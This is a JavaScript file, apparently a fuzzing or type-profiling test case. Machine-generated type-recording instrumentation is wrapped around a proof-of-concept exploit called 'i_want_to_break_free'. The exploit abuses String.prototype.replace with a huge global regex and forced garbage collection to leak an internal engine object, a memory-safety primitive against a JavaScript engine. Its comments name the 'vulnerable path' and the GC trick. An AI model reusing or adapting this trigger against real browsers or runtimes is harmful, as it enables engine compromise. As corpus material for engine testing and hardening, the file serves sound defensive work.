var Inst0 = 0;
var Inst1 = 0;
var Inst2 = 0;
var Inst3 = 0;
var Inst4 = 0;
var Inst5 = 0;
var Inst6 = 0;
var Inst7 = 0;
var Inst8 = 0;
var Inst9 = 0;
var Inst10 = 0;
var Inst11 = 0;
var Inst12 = 0;
var Inst13 = 0;
var Inst14 = 0;
var Inst15 = 0;
var Inst16 = 0;
var Inst17 = 0;
var Inst18 = 0;
var Inst19 = 0;
var Inst20 = 0;
var Inst21 = 0;
var Inst22 = 0;
var Inst23 = 0;
var Inst24 = 0;
var Inst25 = 0;
var Inst26 = 0;
var Inst27 = 0;
var Inst28 = 0;
var Inst29 = 0;
var Inst30 = 0;
var Inst31 = 0;
var Inst32 = 0;
var Inst33 = 0;
var Inst34 = 0;
var Inst35 = 0;
var Inst36 = 0;
var Inst37 = 0;
var Inst38 = 0;
 
function _TypeOfArray(a) {
	let number = true;	
	let string = true;
	for (let i = 0; i < a.length; i++) {
		if (number && (typeof a[i]) != "number") {
			number = false;	
		}
		if (string && (typeof a[i]) != "string") {
			string = false;	
		}
		if (!number && !string)
			break;
	}
	if (number)
		return "number";
	else if (string)
		return "string";
	else
		return "any";
}

function _TypeIsEqual(t1, t2) {
	return JSON.stringify(t1) === JSON.stringify(t2);
}

function _TypeOf(a, step) {
	var t;
	var type = Object.prototype.toString.call(a).slice(8, -1).toLowerCase();	
	if (type == "array") {
		t = {type : type, extra: {elemType: _TypeOfArray(a)}};
	} else if (type == "object") {
		let shape = [];
        if (step === undefined || step > 0) {
            let keys = Object.keys(a);
            let length = Math.min(100, keys.length);
		    for (let i = 0; i < length; i++) {
			    shape.push([keys[i], _TypeOf(a[keys[i]], step === undefined ? 1 : step - 1)]);	
		    }
        }
		t = {type : type, extra: {shape: shape}};
	} else {
		t = {type : type};
	} 
	return t;
}

function _RecordType(loc, a) {
	var t = _TypeOf(a);
    print("~~~TypeInfo:" + loc + ":" + JSON.stringify(t));
}
try { if (Inst0 <= 1000 && typeof (i_want_to_break_free) != "undefined") {_RecordType("<9,29,1>",(i_want_to_break_free)); Inst0++; } } catch(e) {}
function i_want_to_break_free() {
  var n = 0x40000;
try { if (Inst1 <= 1000 && typeof (n) != "undefined") {_RecordType("<40,41,2>",(n)); Inst1++; } } catch(e) {}
  var m = 10;
try { if (Inst2 <= 1000 && typeof (m) != "undefined") {_RecordType("<59,60,3>",(m)); Inst2++; } } catch(e) {}
try { if (Inst4 <= 1000 && typeof (RegExp) != "undefined") {_RecordType("<85,91,4>",(RegExp)); Inst4++; } } catch(e) {}try { if (Inst5 <= 1000 && typeof ("(ab)".repeat) != "undefined") {_RecordType("<92,105,4>",("(ab)".repeat)); Inst5++; } } catch(e) {}try { if (Inst6 <= 1000 && typeof (n) != "undefined") {_RecordType("<106,107,4>",(n)); Inst6++; } } catch(e) {}
  var regex = new RegExp("(ab)".repeat(n), "g"); // g flag to trigger the vulnerable path
try { if (Inst3 <= 1000 && typeof (regex) != "undefined") {_RecordType("<73,78,4>",(regex)); Inst3++; } } catch(e) {}

try { if (Inst8 <= 1000 && typeof ("ab".repeat) != "undefined") {_RecordType("<171,182,6>",("ab".repeat)); Inst8++; } } catch(e) {}try { if (Inst9 <= 1000 && typeof (n) != "undefined") {_RecordType("<183,184,6>",(n)); Inst9++; } } catch(e) {}
  var part = "ab".repeat(n); // matches have to be at least size 2 to prevent interning
try { if (Inst7 <= 1000 && typeof (part) != "undefined") {_RecordType("<164,168,6>",(part)); Inst7++; } } catch(e) {}

try { if (Inst11 <= 1000 && typeof ((part + "|").repeat) != "undefined") {_RecordType("<257,276,8>",((part + "|").repeat)); Inst11++; } } catch(e) {}try { if (Inst12 <= 1000 && typeof (part) != "undefined") {_RecordType("<258,262,8>",(part)); Inst12++; } } catch(e) {}try { if (Inst13 <= 1000 && typeof (m) != "undefined") {_RecordType("<277,278,8>",(m)); Inst13++; } } catch(e) {}
  var s = (part + "|").repeat(m);
try { if (Inst10 <= 1000 && typeof (s) != "undefined") {_RecordType("<253,254,8>",(s)); Inst10++; } } catch(e) {}

  while (true) {
    var cnt = 0;
try { if (Inst14 <= 1000 && typeof (cnt) != "undefined") {_RecordType("<307,310,11>",(cnt)); Inst14++; } } catch(e) {}
    var ary = [];
try { if (Inst15 <= 1000 && typeof (ary) != "undefined") {_RecordType("<324,327,12>",(ary)); Inst15++; } } catch(e) {}
try { if (Inst16 <= 1000 && typeof (s.replace) != "undefined") {_RecordType("<338,347,13>",(s.replace)); Inst16++; } } catch(e) {}try { if (Inst17 <= 1000 && typeof (s) != "undefined") {_RecordType("<338,339,13>",(s)); Inst17++; } } catch(e) {}try { if (Inst18 <= 1000 && typeof (regex) != "undefined") {_RecordType("<348,353,13>",(regex)); Inst18++; } } catch(e) {}
    s.replace(regex, function () {
      for (var i = 1; i < arguments.length - 2; ++i) {
try { if (Inst19 <= 1000 && typeof (i) != "undefined") {_RecordType("<384,385,14>",(i)); Inst19++; } } catch(e) {}try { if (Inst20 <= 1000 && typeof (i) != "undefined") {_RecordType("<391,392,14>",(i)); Inst20++; } } catch(e) {}try { if (Inst21 <= 1000 && typeof (arguments.length) != "undefined") {_RecordType("<395,411,14>",(arguments.length)); Inst21++; } } catch(e) {}try { if (Inst22 <= 1000 && typeof (arguments) != "undefined") {_RecordType("<395,404,14>",(arguments)); Inst22++; } } catch(e) {}try { if (Inst23 <= 1000 && typeof (i) != "undefined") {_RecordType("<419,420,14>",(i)); Inst23++; } } catch(e) {}
try { if (Inst24 <= 1000 && typeof (arguments[i]) != "undefined") {_RecordType("<443,455,15>",(arguments[i])); Inst24++; } } catch(e) {}try { if (Inst25 <= 1000 && typeof (arguments) != "undefined") {_RecordType("<443,452,15>",(arguments)); Inst25++; } } catch(e) {}
        if (typeof arguments[i] !== 'string') {
try { if (Inst27 <= 1000 && typeof (arguments[i]) != "undefined") {_RecordType("<494,506,16>",(arguments[i])); Inst27++; } } catch(e) {}try { if (Inst28 <= 1000 && typeof (arguments) != "undefined") {_RecordType("<494,503,16>",(arguments)); Inst28++; } } catch(e) {}
          i_am_free = arguments[i];
try { if (Inst26 <= 1000 && typeof (i_am_free) != "undefined") {_RecordType("<482,491,16>",(i_am_free)); Inst26++; } } catch(e) {}
          throw "success";
        }

try { if (Inst32 <= 1000 && typeof (arguments[i]) != "undefined") {_RecordType("<567,579,20>",(arguments[i])); Inst32++; } } catch(e) {}try { if (Inst33 <= 1000 && typeof (arguments) != "undefined") {_RecordType("<567,576,20>",(arguments)); Inst33++; } } catch(e) {}
        ary[cnt++] = arguments[i]; // root everything to force GC
try { if (Inst29 <= 1000 && typeof (ary[cnt++]) != "undefined") {_RecordType("<554,564,20>",(ary[cnt++])); Inst29++; } } catch(e) {}try { if (Inst30 <= 1000 && typeof (ary) != "undefined") {_RecordType("<554,557,20>",(ary)); Inst30++; } } catch(e) {}try { if (Inst31 <= 1000 && typeof (cnt) != "undefined") {_RecordType("<558,561,20>",(cnt)); Inst31++; } } catch(e) {}
      }

      return "x";
    });
  }
}

try { if (Inst35 <= 1000 && typeof (e) != "undefined") {_RecordType("<695,696,30>",(e)); Inst35++; } } catch(e) {}
try {
try { if (Inst34 <= 1000 && typeof (i_want_to_break_free) != "undefined") {_RecordType("<662,682,29>",(i_want_to_break_free)); Inst34++; } } catch(e) {}
  i_want_to_break_free();
} catch (e) {
  ;
}

try { if (Inst36 <= 1000 && typeof (console.log) != "undefined") {_RecordType("<707,718,34>",(console.log)); Inst36++; } } catch(e) {}try { if (Inst37 <= 1000 && typeof (console) != "undefined") {_RecordType("<707,714,34>",(console)); Inst37++; } } catch(e) {}try { if (Inst38 <= 1000 && typeof (i_am_free) != "undefined") {_RecordType("<726,735,34>",(i_am_free)); Inst38++; } } catch(e) {}
console.log(typeof i_am_free); // will print "object"

